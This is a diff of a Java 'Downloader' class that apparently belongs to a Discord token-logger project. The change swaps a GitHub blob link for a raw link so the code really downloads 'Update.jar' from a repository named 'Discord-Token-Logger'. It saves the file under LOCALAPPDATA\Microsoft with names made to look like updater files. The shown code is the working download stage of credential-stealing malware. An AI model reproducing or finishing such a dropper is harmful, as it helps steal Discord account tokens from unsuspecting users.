@@ -6,7 +6,7 @@ import java.io.FileOutputStream;
 import java.net.URL;
 
 public class Downloader {
-    private static final String DOWNLOAD_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";
+    private static final String DOWNLOAD_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Update.jar";
     private static final String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
     private static final String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";
     public static void main(String[] args) {
